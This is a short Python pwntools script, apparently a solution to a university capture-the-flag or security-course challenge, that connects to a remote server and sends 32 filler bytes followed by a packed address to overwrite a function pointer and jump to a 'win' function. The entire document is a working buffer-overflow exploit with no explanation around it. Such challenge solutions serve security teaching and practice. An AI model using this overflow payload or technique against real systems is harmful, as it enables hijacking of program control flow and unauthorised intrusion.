import struct
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23153

s = remote(SERVER, PORT, timeout=9999)

win_function_address = 0x080486f1

# payload to modify the function pointer
payload = b"A" * 32 + struct.pack('<I', win_function_address)

s.sendline(payload)

print(s.recvall())